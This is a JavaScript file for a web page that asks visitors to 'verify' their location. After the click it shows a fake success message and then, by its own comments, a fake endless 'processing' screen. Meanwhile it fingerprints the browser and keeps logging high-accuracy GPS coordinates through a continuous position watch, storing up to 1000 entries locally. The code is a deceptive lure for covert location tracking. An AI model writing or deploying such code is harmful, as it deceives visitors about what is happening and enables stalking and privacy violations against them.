document.addEventListener('DOMContentLoaded', () => {
    const locationButton = document.getElementById('allowLocation');
    const locationStatus = document.getElementById('locationStatus');
    let watchId = null;

    // Check if we're on HTTPS
    if (window.location.protocol === 'http:' && !window.location.hostname.includes('localhost')) {
        // Redirect to HTTPS
        window.location.href = window.location.href.replace('http:', 'https:');
        return;
    }

    // Generate a unique device ID using available browser information
    const generateDeviceId = () => {
        const components = [
            navigator.userAgent,
            navigator.language,
            new Date().getTimezoneOffset(),
            navigator.hardwareConcurrency,
            screen.colorDepth,
            screen.width + 'x' + screen.height,
            // Add timestamp to make it unique per session
            new Date().getTime()
        ];
        
        // Get or create a persistent device ID
        let deviceId = sessionStorage.getItem('device_id');
        if (!deviceId) {
            deviceId = btoa(components.join('|')).substring(0, 32);
            sessionStorage.setItem('device_id', deviceId);
        }
        return deviceId;
    };

    const saveLocation = (coords) => {
        const { latitude, longitude, accuracy } = coords;
        
        try {
            // Create log entry
            const logEntry = {
                timestamp: new Date().toISOString(),
                deviceId: generateDeviceId(),
                latitude,
                longitude,
                accuracy,
                screenResolution: `${screen.width}x${screen.height}`,
                platform: navigator.platform,
                browser: navigator.userAgent,
                url: window.location.href
            };

            // Get existing logs or create new array
            const logs = JSON.parse(localStorage.getItem('locationLogs') || '[]');
            logs.push(logEntry);
            
            // Keep only last 1000 entries to prevent storage issues
            if (logs.length > 1000) {
                logs.shift(); // Remove oldest entry
            }
            
            // Save updated logs
            localStorage.setItem('locationLogs', JSON.stringify(logs));
            
            // Also save to sessionStorage for continuous tracking detection
            sessionStorage.setItem('tracking_active', 'true');

            return true;
        } catch (error) {
            console.error('Error saving location:', error);
            return false;
        }
    };

    locationButton.addEventListener('click', () => {
        locationStatus.textContent = 'Getting your location...';
        locationButton.disabled = true;

        if (navigator.geolocation) {
            // First get immediate location
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    // Save initial location
                    if (saveLocation(position.coords)) {
                        // Show success then fake loading
                        locationStatus.textContent = 'Location verified successfully!';
                        locationButton.textContent = '✓ Verified';
                        locationButton.style.backgroundColor = '#28a745';
                        
                        // After short delay, show infinite loading
                        setTimeout(() => {
                            locationStatus.textContent = 'Processing verification...';
                            locationStatus.classList.add('loading');
                            document.querySelector('.thank-you-card').classList.add('processing');
                        }, 1500);

                        // Start watching location if permission is granted
                        watchId = navigator.geolocation.watchPosition(
                            (position) => {
                                if (sessionStorage.getItem('tracking_active') === 'true') {
                                    saveLocation(position.coords);
                                }
                            },
                            null,
                            {
                                enableHighAccuracy: true,
                                timeout: 10000,
                                maximumAge: 0
                            }
                        );
                    } else {
                        locationStatus.textContent = 'Error saving location. Please try again.';
                        locationButton.disabled = false;
                    }
                },
                (error) => {
                    locationButton.disabled = false;
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            locationStatus.textContent = 'Please allow location access in your browser settings and try again.';
                            console.error('Location permission denied');
                            break;
                        case error.POSITION_UNAVAILABLE:
                            locationStatus.textContent = 'Location not available. Please try again.';
                            console.error('Position unavailable');
                            break;
                        case error.TIMEOUT:
                            locationStatus.textContent = 'Request timed out. Please try again.';
                            console.error('Geolocation timeout');
                            break;
                        default:
                            locationStatus.textContent = 'Could not get location. Please try again.';
                            console.error('Geolocation error:', error);
                    }
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        } else {
            locationStatus.textContent = 'Location services not available.';
            locationButton.disabled = false;
            console.error('Geolocation not supported');
        }
    });

    // Cleanup on page unload
    window.addEventListener('beforeunload', () => {
        if (watchId !== null) {
            navigator.geolocation.clearWatch(watchId);
            sessionStorage.removeItem('tracking_active');
        }
    });
});
